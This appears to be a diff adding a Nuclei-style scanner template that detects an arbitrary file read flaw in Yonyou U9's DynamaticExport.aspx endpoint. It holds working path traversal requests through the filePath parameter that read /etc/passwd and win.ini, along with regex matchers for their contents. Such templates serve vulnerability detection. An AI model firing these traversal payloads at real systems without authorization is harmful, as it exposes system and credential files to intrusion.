@@ -1,0 +1,37 @@
+id: yonyou-u9-DynamaticExport-fileread
+info:
+  name: 用友U9 DynamaticExport.aspx接口的任意文件读取漏洞 
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://www.cnblogs.com/ZyonSec/p/18984904
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileread,yonyou,u9
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/print/DynamaticExport.aspx?filePath=../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/print/DynamaticExport.aspx?filePath=../../../../../../../../../../../../Windows/win.ini"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
